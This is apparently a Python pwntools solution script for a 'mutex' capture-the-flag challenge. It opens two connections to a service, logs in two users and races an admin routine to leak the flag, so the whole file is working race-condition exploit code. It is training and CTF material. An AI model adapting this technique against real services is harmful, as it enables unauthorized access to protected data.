#!/usr/bin/env python3
# Remote exploit script for the mutex CTF challenge

import re
import sys
import time
import threading
import argparse
from pwn import *

# Configuration
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 9999
MAX_ATTEMPTS = 30
FLAG_PATTERN = r"CTF\{[^}]+\}"

# Set up logging
context.log_level = 'info'

def find_flag(output):
    """Search for the flag pattern in the output"""
    match = re.search(FLAG_PATTERN, output)
    if match:
        return match.group(0)
    return None

def exploit(host, port):
    """Main exploitation function"""
    log.info(f"Starting exploitation against {host}:{port}")
    
    # Connect to the vulnerable server
    try:
        p = remote(host, port)
    except Exception as e:
        log.error(f"Failed to connect to {host}:{port}: {e}")
        return None
    
    # Wait for initial prompt
    p.recvuntil(b"Try to capture the flag if you can!")
    
    # Register a user
    p.recvuntil(b"Choice: ")
    p.sendline(b"1")
    p.recvuntil(b"Enter username: ")
    p.sendline(b"exploiter")
    log.info("Registered user")
    
    # Login with the user
    p.recvuntil(b"Choice: ")
    p.sendline(b"2")
    p.recvuntil(b"Enter username: ")
    p.sendline(b"exploiter")
    log.info("Logged in")
    
    # Create a second connection to exploit the race condition
    log.info("Starting secondary connection for race condition exploitation")
    try:
        second_p = remote(host, port)
    except Exception as e:
        log.error(f"Failed to create second connection: {e}")
        p.close()
        return None
    
    # Receive initial messages
    second_p.recvuntil(b"Try to capture the flag if you can!")
    
    # Register a second user
    second_p.recvuntil(b"Choice: ")
    second_p.sendline(b"1")
    second_p.recvuntil(b"Enter username: ")
    second_p.sendline(b"racer")
    
    # Login with the second user
    second_p.recvuntil(b"Choice: ")
    second_p.sendline(b"2")
    second_p.recvuntil(b"Enter username: ")
    second_p.sendline(b"racer")
    
    # Strategy:
    # 1. Send a message from the first connection
    # 2. When the admin processes the message, it might copy the flag
    # 3. The second connection will continuously try to access the resource
    #    during this time to catch the flag
    
    def resource_access_thread(proc, results):
        """Thread to continuously access the resource"""
        while True:
            try:
                proc.sendline(b"3")
                output = proc.recvuntil(b"Choice:", timeout=2).decode(errors='ignore')
                
                flag = find_flag(output)
                if flag:
                    results.append(flag)
                    log.success(f"Flag found: {flag}")
                    return
                
                time.sleep(0.1)
            except EOFError:
                log.warning("Connection closed unexpectedly")
                return
            except Exception as e:
                log.debug(f"Error in thread: {e}")
                time.sleep(0.1)
    
    # List to store results
    results = []
    
    for attempt in range(MAX_ATTEMPTS):
        log.info(f"Attempt {attempt+1}/{MAX_ATTEMPTS}")
        
        # Start resource access thread on the second connection
        access_thread = threading.Thread(
            target=resource_access_thread, 
            args=(second_p, results)
        )
        access_thread.daemon = True
        access_thread.start()
        
        # Send a message from the first connection
        p.recvuntil(b"Choice: ")
        p.sendline(b"4")
        p.recvuntil(b"Enter message: ")
        p.sendline(b"Admin, please process this")
        log.info("Message sent to trigger admin processing")
        
        # Wait for a short time to allow admin to process and potentially copy flag
        # Admin thread runs every 10 seconds
        time.sleep(12)
        
        # Check if we found the flag
        if results:
            p.close()
            second_p.close()
            return results[0]
        
        # Also try with the first connection
        p.sendline(b"3")
        try:
            output = p.recvuntil(b"Choice:", timeout=2).decode(errors='ignore')
            flag = find_flag(output)
            if flag:
                log.success(f"Flag found in main connection: {flag}")
                p.close()
                second_p.close()
                return flag
        except:
            pass
    
    log.failure("Could not capture the flag after maximum attempts")
    p.close()
    second_p.close()
    return None

def main():
    parser = argparse.ArgumentParser(description="Mutex CTF Challenge Remote Exploit")
    parser.add_argument("--host", default=DEFAULT_HOST, help="Target host")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Target port")
    args = parser.parse_args()
    
    print("===== Mutex CTF Challenge Remote Exploit =====")
    print(f"Target: {args.host}:{args.port}")
    
    try:
        # Run the exploit
        flag = exploit(args.host, args.port)
        
        if flag:
            print("\n=============================================")
            print(f"SUCCESS! Flag: {flag}")
            print("=============================================")
            return 0
        else:
            print("\nExploitation failed.")
            return 1
            
    except KeyboardInterrupt:
        print("\nExploit interrupted.")
        return 1

if __name__ == "__main__":
    sys.exit(main())